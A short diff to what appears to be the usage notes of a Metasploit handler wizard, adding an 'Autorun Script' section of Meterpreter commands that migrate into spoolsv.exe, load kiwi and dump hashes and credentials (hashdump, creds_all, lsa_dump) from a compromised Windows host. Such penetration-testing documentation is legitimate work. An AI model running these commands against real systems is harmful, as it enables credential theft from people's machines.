@@ -88,6 +88,16 @@ Usage(Wizard):
     msf exploit(handler) > exit
         ...
 ***
+Autorun Script:
+migrate -N spoolsv.exe
+load kiwi
+sysinfo
+hashdump
+creds_all
+lsa_dump
+
+
+***
 To Do:
 
     Create help function.
